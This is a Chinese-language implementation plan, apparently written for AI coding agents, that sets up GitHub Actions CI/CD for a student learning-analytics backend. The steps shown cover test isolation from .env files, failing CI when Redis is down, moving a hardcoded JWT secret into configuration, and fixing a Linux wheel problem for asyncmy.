# GitHub Actions CI/CD 实施计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 为学生学情分析系统建立完整的 GitHub Actions 流水线：每次提交自动做静态检查、后端测试（连真实 Redis）、前端构建；合并到 main 后自动构建 Docker 镜像推送到 GHCR，再通过 SSH 部署到生产服务器，部署失败自动回滚；另有每周依赖漏洞扫描和 Dependabot 自动升级。

**Architecture:** 三个 workflow 各管一件事。`ci.yml` 是检查流水线，PR 和日常推送直接触发它，发布时由 `release.yml` 当作可复用 workflow 调用。`release.yml` 串起「检查 → 构建镜像 → 部署」三个 job，部署在 GitHub 的 `production` 环境下进行，用的都是短期凭据。`security.yml` 定时扫描依赖漏洞。服务器上只放 `docker-compose.yml`、`deploy.sh` 和 `.env` 三个文件，版本切换与回滚都由 `deploy.sh` 按不可变的镜像标签完成。

**Tech Stack:** GitHub Actions（ubuntu-latest）/ Python 3.14 / Node 24 / Redis 7 服务容器 / Docker Buildx + GHCR / Docker Compose / ruff 0.16.7 · actionlint 1.7.12 · shellcheck 0.11.0 · hadolint 2.15.1 · pip-audit 2.10.1 / pytest-cov

**Spec:** 没有独立的设计文档，需求见下面的「项目要求」。

> **部署部分已更新**：生产服务器是中国内地的阿里云 ECS（2GB 内存，只装了 Docker），部署改为按 `docs/superpowers/plans/2026-09-15-production-deployment.md` 执行：MySQL、Redis、Nginx 一起用 Compose 编排，用 Let's Encrypt 的 IP 证书提供 HTTPS，镜像推送到阿里云 ACR，而不是 GHCR。因此本计划的 **Task 9、11、12 由部署计划取代，跳过不做**；Task 1–8、10 照常执行；Task 13 的分支保护照做，CLAUDE.md 的内容以部署计划 Task 9 为准。

## 项目要求

| # | 要求 |
|---|---|
| R1 | 推送代码（main 以外的分支）和每个指向 main 的 PR，都自动运行静态检查、后端测试、前端构建；任何一项失败都能在 PR 页面直接看到 |
| R2 | 后端测试连真实的 Redis 运行；Redis 不可用时流水线失败，不允许静默跳过 |
| R3 | 测试不依赖任何人本机的 `.env`，不需要真实的大模型密钥和 MySQL |
| R4 | PR 上验证 Dockerfile 能构建、镜像里的应用能导入 |
| R5 | 合并到 main 后自动执行：完整检查 → 构建镜像，以 `sha-<提交号>` 和 `latest` 两个标签推送到 GHCR → 部署到生产服务器 |
| R6 | 部署后做就绪检查（Redis、MySQL 都连得上），不通过就自动回滚到上一个版本，并让流水线标红 |
| R7 | 可以手动把线上回滚到任意一个历史版本 |
| R8 | 密钥最小暴露：代码和镜像里没有密钥；GitHub 只保存 SSH 私钥和主机指纹；应用密钥只放在服务器的 `.env`；拉镜像用只在任务期间有效的临时令牌 |
| R9 | 每周扫描依赖漏洞并出报告；依赖、Action、基础镜像的版本更新由 Dependabot 自动提 PR |
| R10 | main 分支受保护：必须通过 PR 合并，且检查全部通过 |

## 这份计划里哪些已经验证过

所有代码改动都在仓库的干净副本（`git archive` 导出，不含 `.env`）里实现并运行过，文档中的代码块直接从副本导出：

- **后端测试**：在「CI 模式」（只有占位的环境变量、没有 `.env`）下 30 passed。另有 20 个依赖 Redis 的测试被跳过，因为编写时本机的 Redis 没有启动；这些测试在真实 Redis 上的结果，此前开发时已经确认过（39 passed）
- **新测试都先失败、后通过**；配置加载和部署回滚还做了变异验证：去掉被测的那道防护，恰好有对应的测试失败
- **workflow**：三个文件都通过了 actionlint 1.7.12 的检查（包括 shellcheck）。`ci.yml` 在 Task 7、8、9 三个阶段结束时各检查了一次
- **Action 版本**：用到的 7 个官方 Action，逐个对照了它们在 2026-09-15 的最新版本和 `action.yml` 里的输入参数
- **依赖**：149 个固定版本在 Linux x86_64 + CPython 3.14 上能否安装，逐个查了 PyPI；pip 按 Linux 平台完整解析通过
- **镜像**：Dockerfile 通过了 hadolint；镜像的启动方式（在仓库根目录执行 `uvicorn backend.main:app`，只有环境变量、没有 `.env`）在本机验证过
- **部署脚本**：`deploy.sh` 用桩命令测过 4 种场景，含变异验证，通过 shellcheck
- **前端**：`npm ci && npm run build` 在本机通过

**本机没法验证、第一次运行时要重点看的：**

- 本机没有 Docker，镜像没有真正构建过。Task 8 完成后开 PR，由 CI 第一次构建
- workflow 还没有在 GitHub 上真正运行过
- 没有服务器，SSH 部署、Compose 和回滚的真实执行，由 Task 12 的第一次发布来验证
- actionlint 没有收录这批 Action v7 版本的数据，不会检查它们的参数名；这部分已经人工核对过

## 编写时发现、并已纳入计划的问题

1. **有 3 个测试依赖本机的 `.env`**，在 CI 里必然失败（Task 1）
2. **Redis 不可用时测试会静默跳过**，流水线却是绿色的（Task 2）
3. **JWT 签名密钥写死在代码里**，而仓库是公开的，任何人都能伪造登录凭证。部署到公网之前必须修掉，旧密钥作废（Task 3）
4. **`asyncmy==0.2.11` 在 Linux + Python 3.14 上没有现成的 wheel**，slim 镜像里没有编译器，镜像会构建失败（Task 4）
5. **ruff 基线有 15 个问题**，全是未使用的导入这一类，可以自动修复（Task 5）
6. **依赖漏洞基线：149 个包里有 21 个存在已知漏洞**，其中 starlette、langchain-core、pyjwt 等需要跨版本升级。所以漏洞扫描先做成报告，不阻塞合并（Task 10）
7. **GHCR 的镜像名必须全小写**，而仓库属主 `Jepson-Wang` 里有大写字母（Task 12）
8. **README 和 CLAUDE.md 里「仓库不含前端」的说法已经过时**：仓库里有一个 Vue 3 + Vite 的前端，CI 加了前端构建检查（Task 7）

## 知识点索引

| 编号 | 知识点 | 在哪里学 |
|---|---|---|
| K1 | 测试隔离：用子进程测试「导入时读配置」 | Task 1 |
| K2 | 环境变量与 `.env` 的优先级、12-Factor 配置 | Task 1、3、11 |
| K3 | CI 里的「静默跳过」陷阱 | Task 2 |
| K4 | 密钥管理：不写进代码、泄露后轮换、fail fast | Task 3、11 |
| K5 | wheel、平台标签与源码包：为什么同一个版本在 Linux 上装不上 | Task 4 |
| K6 | 版本固定与可复现构建 | Task 4、7 |
| K7 | 静态检查与渐进式启用规则 | Task 5 |
| K8 | 存活检查（liveness）与就绪检查（readiness） | Task 6 |
| K9 | GitHub Actions 的基本结构：workflow / job / step / runner | Task 7 |
| K10 | 触发器：`pull_request`、`push`、`paths`、`branches-ignore`、`workflow_call`、`workflow_dispatch`、`schedule` | Task 7、10、12 |
| K11 | `GITHUB_TOKEN` 与最小权限 `permissions` | Task 7、12 |
| K12 | `concurrency` 并发控制 | Task 7、12 |
| K13 | 依赖缓存（`setup-python` / `setup-node` 的 `cache`） | Task 7 |
| K14 | 服务容器 `services` 与健康检查 | Task 7 |
| K15 | 运行结果的呈现：GitHub 注解、Job 摘要、Artifact | Task 7 |
| K16 | Docker 镜像：分层缓存、非 root 用户、`.dockerignore`、`HEALTHCHECK` | Task 8 |
| K17 | Buildx 与 GitHub Actions 缓存（`type=gha`） | Task 8 |
| K18 | Shell 严格模式与「桩」测试 | Task 9 |
| K19 | Docker Compose 与具名卷 | Task 9 |
| K20 | 不可变标签、自动回滚 | Task 9、12 |
| K21 | 供应链安全：依赖扫描、Dependabot、下载校验、固定 Action 版本 | Task 7、10 |
| K22 | 定时任务 `cron` | Task 10 |
| K23 | SSH 密钥部署与主机指纹校验 | Task 11、12 |
| K24 | Environments、Secrets 与 Variables | Task 11、12 |
| K25 | 可复用 workflow、job 之间传值（`needs` / `outputs`）、`if` 条件 | Task 12 |
| K26 | 表达式注入（script injection） | Task 12 |
| K27 | 短期凭据：用 `GITHUB_TOKEN` 临时登录 GHCR | Task 12 |
| K28 | 分支保护与必需检查 | Task 13 |

## Global Constraints

- runner 统一用 `ubuntu-latest`；Python `"3.14"`（与 `requirements.txt` 的锁定环境一致）；Node `"24"`。
- Action 版本（2026-09-15 核对）：`actions/checkout@v7`、`actions/setup-python@v7`、`actions/setup-node@v7`、`actions/upload-artifact@v7`、`docker/setup-buildx-action@v4`、`docker/login-action@v4`、`docker/build-push-action@v7`。使用主版本标签；对安全要求更高时，改为固定到完整的提交 SHA。
- 基础镜像 `python:3.14-slim`；测试用的服务容器 `redis:7-alpine`。
- 镜像名 `ghcr.io/<仓库名全小写>`，标签为 `sha-<7位提交号>` 和 `latest`。部署和回滚只用 `sha-` 标签。
- 每个 workflow 顶层都写 `permissions: contents: read`，需要更多权限的 job 单独声明。
- CI 里只用占位配置；真实密钥只放在 `production` 环境的 Secrets 和服务器的 `.env` 里。
- 用户输入以及 `github` 上下文里不可信的值，一律先放进 `env`，再在 shell 里引用。
- 命令示例用 bash 语法，Windows 下在 Git Bash 里执行；PowerShell 里设置环境变量写作 `$env:NAME="value"`。
- 提交信息用中文，遵循 `feat:` / `fix:` / `refactor:` / `test:` / `docs:` 前缀。

## 分支与发布模型

```
backend 分支（日常开发）
   │  每次推送 → ci.yml：静态检查 + 后端测试 + 前端构建
   ▼
PR：backend → main
   │  ci.yml 再跑一遍，外加镜像构建检查；全部通过才能合并（Task 13 的分支保护）
   ▼
合并到 main
   │  release.yml：调用 ci.yml → 构建并推送镜像 → 部署（production 环境）
   ▼
服务器：deploy.sh 拉镜像 → 替换容器 → 就绪检查 → 失败自动回滚
```

## 文件结构

**新建**

| 文件 | 职责 | 任务 |
|---|---|---|
| `backend/tests/isolation.py` | 在子进程里运行代码的测试辅助工具 | 1 |
| `backend/tests/test_redis_policy.py` | Redis 不可用时的处理策略的测试 | 2 |
| `backend/tests/test_security.py` | JWT 密钥来自配置的测试 | 3 |
| `backend/requirements-tools.txt` | 检查工具（ruff、shellcheck、hadolint、pip-audit），不进生产镜像 | 4 |
| `backend/ruff.toml` | 静态检查规则 | 5 |
| `backend/api/health_api.py` | 存活与就绪检查接口 | 6 |
| `backend/tests/test_health.py` | 健康检查的测试 | 6 |
| `backend/.coveragerc` | 覆盖率统计范围 | 7 |
| `.github/workflows/ci.yml` | 检查流水线（可复用） | 7、8、9 |
| `Dockerfile`、`.dockerignore` | 后端服务镜像 | 8 |
| `deploy/docker-compose.yml` | 服务器上的编排文件 | 9 |
| `deploy/deploy.sh` | 服务器上的部署与回滚脚本 | 9 |
| `deploy/test_deploy.sh` | 部署脚本的桩测试 | 9 |
| `.github/workflows/security.yml` | 每周依赖漏洞扫描 | 10 |
| `.github/dependabot.yml` | 依赖自动更新 | 10 |
| `backend/.env.example` | 配置模板 | 11 |
| `.github/workflows/release.yml` | 发布流水线：检查 → 镜像 → 部署 | 12 |

**修改**

| 文件 | 改动 | 任务 |
|---|---|---|
| `backend/tests/test_config_env.py` | 改为使用临时 `.env` 和子进程 | 1 |
| `backend/tests/conftest.py` | Redis 不可用时，按 `REQUIRE_REDIS` 决定跳过还是失败 | 2 |
| `backend/core/security.py` | JWT 密钥改为从 `JWT_SECRET_KEY` 读取，删掉注释掉的旧代码 | 3 |
| `backend/requirements.txt` | `asyncmy` 0.2.11 → 0.2.12 | 4 |
| ruff 自动修复涉及的 8 个文件 | 删除未使用的导入等 | 5 |
| `backend/main.py` | 挂载健康检查路由 | 6 |
| `CLAUDE.md` | 新增 CI/CD 章节 | 13 |

---

## Task 1: 测试不依赖开发机的 `.env`

**为什么先做这个**：`backend/tests/test_config_env.py` 里有 3 个测试会先删掉 `API_KEY`、`REDIS_PASSWORD` 这些环境变量，再断言 `load_env()` 能从 `backend/.env` 里把它们读回来。这就要求运行测试的机器上必须有一份真实的 `.env`。你的电脑上有，所以一直是绿的；CI 从 GitHub 拉下来的代码里没有 `.env`（它被 `.gitignore` 忽略了），这 3 个测试一定会失败。

**解决思路**：每个测试自己写一份临时 `.env`，在一个全新的 Python 子进程里把 `ENV_PATH` 指向它，然后再导入被测模块。

**Files:**
- Create: `backend/tests/isolation.py`
- Modify: `backend/tests/test_config_env.py`（整体替换）

**Interfaces:**
- Consumes: `backend.core.config.BACKEND_ROOT`、`ENV_PATH`、`load_env()`、`_loaded`
- Produces:
  - `backend.tests.isolation.write_env_file(path: Path, values: dict) -> Path`
  - `backend.tests.isolation.run_isolated(code: str, env_file: Path, cwd: Path, extra_env: dict | None = None) -> subprocess.CompletedProcess`
  - `backend.tests.isolation.CONFIG_KEYS`：启动子进程前要从环境里去掉的键（Task 3 会用到其中的 `JWT_SECRET_KEY`）

- [ ] **Step 1: 在「没有 .env」的条件下复现 CI 会遇到的失败**

**知识点**：K2 环境变量与 `.env` 的优先级

```bash
cd backend
mv .env .env.bak                 # 临时拿走 .env，模拟 CI 的环境
python -m pytest tests/test_config_env.py -v
mv .env.bak .env                 # 一定要改回来
```

Expected: 3 failed、3 passed。失败的是 `test_load_env_works_from_any_cwd`、`test_get_llm_reads_config_without_prior_load`、`test_redis_url_carries_credentials_without_prior_load`，断言信息分别是「读不到 API_KEY」「api_key 为 None」「REDIS_PASSWORD 为 None」。

- [ ] **Step 2: 写测试辅助工具**

**知识点**：K1 测试隔离

创建 `backend/tests/isolation.py`：

```python
"""
在全新的 Python 子进程里运行一段代码的测试辅助工具。

用于测试「模块导入时读取配置」这类行为：
1. 子进程里没有被本进程导入过的模块，也没有已经加载过的 .env，测到的就是真实的首次导入
2. 子进程写进环境变量的值、导入的模块都随进程结束而消失，不会污染后面的测试
"""
import os
import subprocess
import sys
from pathlib import Path

from backend.core.config import BACKEND_ROOT

# 启动子进程前从环境里去掉的键：load_env 不覆盖已存在的变量，不去掉的话读到的是外面（开发机或 CI）的值
CONFIG_KEYS = (
    "API_KEY", "API_URL", "MODEL_NAME", "EMBEDDING_MODEL", "SQL_DATABASE_URL", "JWT_SECRET_KEY",
    "REDIS_URL", "REDIS_HOST", "REDIS_PORT", "REDIS_PASSWORD", "REDIS_USERNAME", "REDIS_DB",
)


def write_env_file(path: Path, values: dict) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("".join(f"{k}={v}\n" for k, v in values.items()), encoding="utf-8")
    return path


def run_isolated(code: str, env_file: Path, cwd: Path, extra_env: dict | None = None) -> subprocess.CompletedProcess:
    """以 cwd 为工作目录、把 ENV_PATH 指向 env_file，在新进程里执行 code。"""
    env = {k: v for k, v in os.environ.items() if k not in CONFIG_KEYS}
    env["PYTHONPATH"] = str(BACKEND_ROOT.parent)
    env.update(extra_env or {})
    prelude = (
        "import backend.core.config as cfg\n"
        "from pathlib import Path\n"
        f"cfg.ENV_PATH = Path({str(env_file)!r})\n"
    )
    return subprocess.run(
        [sys.executable, "-c", prelude + code],
        cwd=cwd, env=env, capture_output=True, text=True, encoding="utf-8", timeout=120,
    )
```

为什么要用子进程，而不是 `importlib.reload` 加 `monkeypatch`：

- `load_dotenv` 会把 `.env` 里的值写进 `os.environ`。`monkeypatch.delenv` 只会恢复它删掉的键，**测试前本来就不存在、由 `.env` 新写进去的键不会被清理**。结果是后面的测试读到假的 `REDIS_HOST=redis.invalid`，Redis 测试全部连错地方。
- `importlib.reload` 会把模块里的全局变量（比如 `get_llm.api_key`）改成测试用的值，而且测试结束后不会恢复。
- 子进程天然隔离：它结束时，一切都随之消失。代价是每个测试要多花 1 到 2 秒启动解释器，这里只有 4 个测试这样做，可以接受。

- [ ] **Step 3: 替换测试文件**

**知识点**：K1 测试隔离、K2 环境变量优先级

用下面的内容整体替换 `backend/tests/test_config_env.py`：

```python
"""
环境变量单一加载入口（core/config.load_env）的测试。

不读开发机上真实的 backend/.env：每个测试写一份临时 .env，在子进程里把 ENV_PATH 指过去再导入被测模块。
没有 .env 的环境（CI、新同事的电脑）也能跑，断言的值也是确定的。
"""
import pytest

import backend.core.config as cfg
from backend.core.config import BACKEND_ROOT, ENV_PATH
from backend.tests.isolation import run_isolated, write_env_file

FAKE_ENV = {
    "API_KEY": "key-from-dotenv",
    "API_URL": "http://dotenv.invalid/v1",
    "REDIS_HOST": "redis.invalid",
    "REDIS_PORT": "6380",
    "REDIS_PASSWORD": "pass-from-dotenv",
}


@pytest.fixture
def fake_dotenv(tmp_path):
    return write_env_file(tmp_path / "config" / ".env", FAKE_ENV)


def _stdout(result) -> str:
    assert result.returncode == 0, result.stderr
    return result.stdout.strip()


def test_env_path_is_absolute_and_points_at_backend():
    assert ENV_PATH.is_absolute()
    assert ENV_PATH.name == ".env"
    assert ENV_PATH.parent == BACKEND_ROOT
    assert BACKEND_ROOT.name == "backend"


def test_load_env_works_from_any_cwd(fake_dotenv, tmp_path):
    """工作目录里没有 .env，也能按 ENV_PATH 读到"""
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    out = _stdout(run_isolated("cfg.load_env()\nimport os\nprint(os.getenv('API_KEY'))", fake_dotenv, cwd=elsewhere))
    assert out == "key-from-dotenv"


def test_load_env_is_idempotent(tmp_path, monkeypatch):
    monkeypatch.setattr(cfg, "ENV_PATH", write_env_file(tmp_path / ".env", {}))
    monkeypatch.setattr(cfg, "_loaded", False)
    cfg.load_env()
    cfg.load_env()
    assert cfg._loaded is True


def test_real_env_overrides_dotenv(fake_dotenv, tmp_path):
    """容器与 CI 注入的环境变量，优先级必须高于 .env 文件"""
    result = run_isolated(
        "cfg.load_env()\nimport os\nprint(os.getenv('API_KEY'))",
        fake_dotenv, cwd=tmp_path, extra_env={"API_KEY": "sentinel-from-real-env"},
    )
    assert _stdout(result) == "sentinel-from-real-env"


def test_get_llm_reads_config_without_prior_load(fake_dotenv, tmp_path):
    """get_llm 必须自己调用 load_env，不能依赖别的模块先加载过"""
    result = run_isolated("import backend.agents.agent.get_llm as m\nprint(m.api_key, m.base_url)", fake_dotenv, cwd=tmp_path)
    assert _stdout(result) == "key-from-dotenv http://dotenv.invalid/v1"


def test_redis_url_carries_credentials_without_prior_load(fake_dotenv, tmp_path):
    """redis_client 必须自己调用 load_env，否则密码读成 None，最后以 AuthenticationError 的面目失败"""
    result = run_isolated("import backend.utils.redis_client as rc\nprint(rc._build_redis_url())", fake_dotenv, cwd=tmp_path)
    assert _stdout(result) == "redis://:pass-from-dotenv@redis.invalid:6380/0"
```

每个测试想证明的事情和原来一样，只是不再依赖外部环境：

| 测试 | 证明什么 |
|---|---|
| `test_load_env_works_from_any_cwd` | 工作目录里没有 `.env`，也能按绝对路径 `ENV_PATH` 读到 |
| `test_real_env_overrides_dotenv` | 真实的环境变量优先于 `.env`。CI 和容器正是靠这一点注入配置的 |
| `test_get_llm_reads_config_without_prior_load` | `get_llm.py` 自己调用了 `load_env()`，不依赖导入顺序 |
| `test_redis_url_carries_credentials_without_prior_load` | `redis_client.py` 同上 |

- [ ] **Step 4: 有没有 `.env` 都要通过**

```bash
cd backend
python -m pytest tests/test_config_env.py -v
mv .env .env.bak && python -m pytest tests/test_config_env.py -v; mv .env.bak .env
```

Expected: 两次都是 6 passed。

- [ ] **Step 5: 提交**

```bash
git add backend/tests/isolation.py backend/tests/test_config_env.py
git commit -m "test: 配置加载测试改用临时 .env 与子进程，不再依赖开发机配置"
```

---

## Task 2: CI 里 Redis 不可用时必须失败

**为什么**：`conftest.py` 的 `redis_test_client` 在 Redis 连不上时会 `pytest.skip`。这在本地很友好，没开 Redis 也能跑其余测试；但在 CI 里是个陷阱。如果服务容器没配好，19 个依赖 Redis 的测试会全部跳过，流水线照样显示绿色，而这些测试实际上一个都没跑。编写这份计划时，本机的 Redis 恰好没开，就是这样：「22 passed, 20 skipped」，看起来一切正常。

**解决思路**：用一个环境变量切换行为。本地保持跳过；CI 里设置 `REQUIRE_REDIS=1`，Redis 连不上就直接失败。

**Files:**
- Modify: `backend/tests/conftest.py`
- Create: `backend/tests/test_redis_policy.py`

**Interfaces:**
- Produces: `backend.tests.conftest.redis_unavailable(reason: str) -> None`：`REQUIRE_REDIS=1` 时调用 `pytest.fail`，否则调用 `pytest.skip`
- CI 约定：`ci.yml` 的 test job 设置 `REQUIRE_REDIS: "1"`（Task 7）

- [ ] **Step 1: 写失败的测试**

**知识点**：K3 CI 里的「静默跳过」陷阱

创建 `backend/tests/test_redis_policy.py`：

```python
import pytest

from backend.tests.conftest import redis_unavailable


def test_skips_locally_by_default(monkeypatch):
    monkeypatch.delenv("REQUIRE_REDIS", raising=False)
    with pytest.raises(pytest.skip.Exception):
        redis_unavailable("连不上 Redis")


def test_fails_when_redis_is_required(monkeypatch):
    """CI 设置了 REQUIRE_REDIS=1：Redis 连不上必须是红色的失败，而不是绿色的跳过"""
    monkeypatch.setenv("REQUIRE_REDIS", "1")
    with pytest.raises(pytest.fail.Exception, match="连不上 Redis"):
        redis_unavailable("连不上 Redis")
```

`pytest.skip()` 和 `pytest.fail()` 是通过抛出特殊异常来实现的，所以可以用 `pytest.raises` 捕获这两种异常，测试它们的行为。

- [ ] **Step 2: 运行测试确认失败**

Run: `cd backend && python -m pytest tests/test_redis_policy.py -v`
Expected: 收集阶段报 `ImportError: cannot import name 'redis_unavailable'`

- [ ] **Step 3: 实现**

在 `backend/tests/conftest.py` 的 `TEST_DB = 15` 之后加入：

```python
def redis_unavailable(reason: str) -> None:
    """
    Redis 连不上时怎么办：本地默认 skip，设置了 REQUIRE_REDIS=1（CI 里）就直接失败。
    CI 专门起了 Redis 服务，这时还连不上说明流水线配置坏了；如果照样 skip，
    依赖 Redis 的测试会一个不跑、结果却是绿色，问题被悄悄藏起来。
    """
    if os.getenv("REQUIRE_REDIS") == "1":
        pytest.fail(f"REQUIRE_REDIS=1，但 {reason}", pytrace=False)
    pytest.skip(reason)
```

然后把 `redis_test_client` 里连不上 Redis 时的那一行：

```python
        pytest.skip(f"测试需要可用的 Redis（db {TEST_DB}）：{e}")
```

改成：

```python
        redis_unavailable(f"测试需要可用的 Redis（db {TEST_DB}）：{e}")
```

`pytrace=False` 让失败信息只显示这一句话，不显示堆栈。这里原因已经很清楚了，堆栈只会干扰阅读。

- [ ] **Step 4: 运行测试，并亲眼看一下两种行为**

```bash
cd backend
python -m pytest tests/test_redis_policy.py -v
REDIS_PORT=1 python -m pytest tests/test_smoke.py -q
REDIS_PORT=1 REQUIRE_REDIS=1 python -m pytest tests/test_smoke.py -q
```

Expected:
- 第一条：2 passed
- 第二条：`1 passed, 1 skipped`。故意把端口指向 1，Redis 必然连不上，本地的默认行为是跳过
- 第三条：`1 passed, 1 error`，报错信息以 `REQUIRE_REDIS=1，但 测试需要可用的 Redis` 开头

第二、三条之所以能这样临时改端口，靠的正是 Task 1 验证过的规则：命令行设置的环境变量优先于 `.env`。

- [ ] **Step 5: 提交**

```bash
git add backend/tests/conftest.py backend/tests/test_redis_policy.py
git commit -m "test: CI 中 Redis 不可用时测试失败而不是静默跳过"
```

---

## Task 3: JWT 密钥改为从配置读取

**为什么这是部署的前提**：`backend/core/security.py` 第 66 行写着 `SECRET_KEY = "3f8a2b..."`，文件开头注释掉的旧代码里也有同一个值。仓库是公开的，所以这个密钥等于公开：任何人都能用它签发一个 `{"sub": "任意用户"}` 的 JWT，冒充任何人调用接口。只在本机运行时问题不大；自动部署到公网之后，这就是一个真实可用的漏洞。

**这个密钥必须当作已经泄露**：即使把它从代码里删掉，它也永远留在 Git 历史里。所以生产环境要生成一个全新的密钥，而不是把旧值挪进 `.env`。

**Files:**
- Modify: `backend/core/security.py`（整体替换）
- Create: `backend/tests/test_security.py`
- Modify: 你本机的 `backend/.env`（新增一行，不提交）

**Interfaces:**
- Consumes: Task 1 的 `run_isolated`、`write_env_file`
- Produces: 配置项 `JWT_SECRET_KEY`（必填，缺失时导入 `backend.core.security` 会抛 `RuntimeError`）。`SECRET_KEY`、`ALGORITHM`、`create_access_token` 等名字保持不变，`api/dependencies.py` 和 `login_service.py` 不用改

- [ ] **Step 1: 写失败的测试**

**知识点**：K4 密钥管理

创建 `backend/tests/test_security.py`：

```python
"""JWT 密钥必须来自配置：代码里写死的密钥进了公开仓库，谁都能拿它伪造登录凭证。"""
from backend.tests.isolation import run_isolated, write_env_file

SIGN_AND_VERIFY = (
    "import jwt\n"
    "from backend.core.security import ALGORITHM, SECRET_KEY, create_access_token\n"
    "token = create_access_token({'sub': 'alice'})\n"
    "print(SECRET_KEY, jwt.decode(token, 'secret-from-dotenv', algorithms=[ALGORITHM])['sub'])\n"
)


def test_secret_key_is_read_from_config(tmp_path):
    env_file = write_env_file(tmp_path / ".env", {"JWT_SECRET_KEY": "secret-from-dotenv"})
    result = run_isolated(SIGN_AND_VERIFY, env_file, cwd=tmp_path)
    assert result.returncode == 0, result.stderr
    assert result.stdout.split() == ["secret-from-dotenv", "alice"]


def test_missing_secret_key_fails_fast(tmp_path):
    """没配密钥时启动就报错，而不是悄悄用一个不安全的默认值"""
    env_file = write_env_file(tmp_path / ".env", {})
    result = run_isolated("import backend.core.security", env_file, cwd=tmp_path)
    assert result.returncode != 0
    assert "JWT_SECRET_KEY" in result.stderr
```

- [ ] **Step 2: 运行测试确认失败**

Run: `cd backend && python -m pytest tests/test_security.py -v`
Expected: 2 failed。第一个报 `InvalidSignatureError`，说明签名用的仍是写死的密钥；第二个是因为现在不配密钥也能正常导入，退出码为 0。

- [ ] **Step 3: 实现**

**知识点**：K4 fail fast、K2 单一加载入口

用下面的内容整体替换 `backend/core/security.py`：

```python
import os
from datetime import datetime, timedelta, timezone
from typing import Optional

import bcrypt
import jwt

from backend.core.config import load_env

load_env()

# JWT 签名密钥必须来自配置（backend/.env 或环境变量），不能写在代码里：
# 仓库是公开的，写死的密钥等于公开，任何人都能用它伪造登录凭证。
# 生成新密钥：python -c "import secrets; print(secrets.token_hex(32))"
SECRET_KEY = os.getenv("JWT_SECRET_KEY")
if not SECRET_KEY:
    raise RuntimeError(
        "JWT_SECRET_KEY 未配置：请在 backend/.env 或环境变量中设置。"
        "生成方法：python -c \"import secrets; print(secrets.token_hex(32))\""
    )
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24


def verify_password(plain_password: str, hashed_password: str) -> bool:
    """验证密码"""
    # 直接使用bcrypt进行密码验证
    try:
        return bcrypt.checkpw(plain_password.encode('utf-8'), hashed_password.encode('utf-8'))
    except Exception:
        return False


def get_password_hash(password: str) -> str:
    """获取密码哈希值"""
    # 直接使用bcrypt生成密码哈希
    salt = bcrypt.gensalt()
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed.decode('utf-8')


def create_access_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + (
        expires_delta if expires_delta else timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    )
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
```

改动只有三处，函数体和原来逐字相同：

1. 删掉文件开头两段注释掉的旧实现（约 60 行），它们里面也有同一个密钥
2. 密钥改从 `JWT_SECRET_KEY` 读取，读不到就在导入时抛异常，服务直接起不来。这就是「fail fast」：配置错了立刻暴露，而不是带着一个不安全的默认值悄悄运行
3. 调用 `load_env()`，遵守项目「环境变量只从一个入口加载」的约定（记忆计划 Task 1）

- [ ] **Step 4: 给本机的 `.env` 加上密钥**

```bash
cd backend
python -c "import secrets; print('JWT_SECRET_KEY=' + secrets.token_hex(32))" >> .env
```

这一步不做的话，本机启动服务、跑导入主应用的测试都会报 `JWT_SECRET_KEY 未配置`。换了密钥之后，之前签发的登录凭证全部失效，需要重新登录。

- [ ] **Step 5: 运行测试**

Run: `cd backend && python -m pytest tests/ -v`
Expected: 全部 passed（Redis 没开时，依赖 Redis 的测试显示为 skipped）

- [ ] **Step 6: 提交**

```bash
git add backend/core/security.py backend/tests/test_security.py
git commit -m "fix: JWT 密钥改为从 JWT_SECRET_KEY 读取，移除写死在代码里的密钥"
```

---

## Task 4: 依赖能在 Linux 上安装，并准备检查工具

**为什么**：你的开发机是 Windows，而 GitHub 的 runner 和 Docker 镜像都是 Linux。同一个版本的包，在两个平台上不一定都有现成的安装包（wheel）。逐个查过 PyPI 后，149 个依赖里有两个在 Linux + Python 3.14 上没有 wheel：

- `jieba==0.42.1`：纯 Python 的源码包，在任何地方都能直接安装，没问题
- `asyncmy==0.2.11`：用 Cython 写的，从源码安装需要 C 编译器。GitHub runner 上有编译器，勉强能装；但 `python:3.14-slim` 镜像里没有，**镜像会构建失败**。`0.2.12` 在 Linux 和 Windows 上都有 cp314 的 wheel

**Files:**
- Modify: `backend/requirements.txt`（一行）
- Create: `backend/requirements-tools.txt`

**Interfaces:**
- Produces: `backend/requirements-tools.txt`，供 Task 5 的本地检查、Task 7 的 lint job、Task 10 的漏洞扫描使用

- [ ] **Step 1: 亲眼看看「这个版本在 Linux 上没有 wheel」是什么意思**

**知识点**：K5 wheel、平台标签与源码包

```bash
cd backend
pip download asyncmy==0.2.11 --only-binary=:all: --platform manylinux_2_17_x86_64 --python-version 3.14 --implementation cp --abi cp314 --no-deps -d /tmp/wheelcheck
pip download asyncmy==0.2.12 --only-binary=:all: --platform manylinux_2_17_x86_64 --python-version 3.14 --implementation cp --abi cp314 --no-deps -d /tmp/wheelcheck
```

Expected：第一条报 `No matching distribution found for asyncmy==0.2.11`；第二条下载到 `asyncmy-0.2.12-cp314-cp314-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl`。

wheel 的文件名就是它的「适用范围」：`cp314` 表示 CPython 3.14，`manylinux_2_17_x86_64` 表示 glibc ≥ 2.17 的 64 位 Linux。pip 安装时会先找匹配当前平台的 wheel，找不到才退回源码包（`.tar.gz`）自己编译。`--only-binary=:all:` 禁止退回源码包，所以能用来检查「有没有现成的 wheel」。

- [ ] **Step 2: 升级 asyncmy**

**知识点**：K6 版本固定

把 `backend/requirements.txt` 里的 `asyncmy==0.2.11` 改成 `asyncmy==0.2.12`，然后在本机的虚拟环境里同步：

```bash
cd backend
pip install asyncmy==0.2.12
python -c "from sqlalchemy.ext.asyncio import create_async_engine; e = create_async_engine('mysql+asyncmy://u:p@127.0.0.1:9/db'); print(e.dialect.name, e.dialect.driver)"
```

